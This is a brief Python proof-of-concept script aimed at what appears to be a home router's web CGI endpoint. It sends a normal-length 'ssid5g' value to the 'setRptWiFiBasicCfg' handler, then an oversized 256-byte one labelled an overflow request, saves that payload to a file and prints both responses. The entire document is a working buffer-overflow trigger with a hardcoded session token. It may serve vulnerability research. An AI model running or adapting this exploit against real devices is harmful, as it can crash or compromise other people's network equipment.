# export QUERY_STRING=
# export CONTENT_LENGTH=
import json
import requests

HOST = "192.168.0.1"
PORT = 80

url = f"http://{HOST}/cgi-bin/cstecgi.cgi"

# safe request:
data = {
    "topicurl": "setRptWiFiBasicCfg",
    "ssid5g": "a" * 0x10,
    "token": "5a65e2cdb95c558d33521f54a6a912f2",
}


safe_res = requests.post(url, json=data)
print(f"safe res: {safe_res.status_code} {safe_res.text}")

# overflow request
data = {
    "topicurl": "setRptWiFiBasicCfg",
    "ssid5g": "a" * 0x100,
    "token": "5a65e2cdb95c558d33521f54a6a912f2",
}

with open("./payload", "w") as f:
    json.dump(data, f)

print(f"CONTENT_LENGTH: {len(str(data))}")

res = requests.post(url, json=data)
print(f"overflow res: {res.status_code} {res.text}")
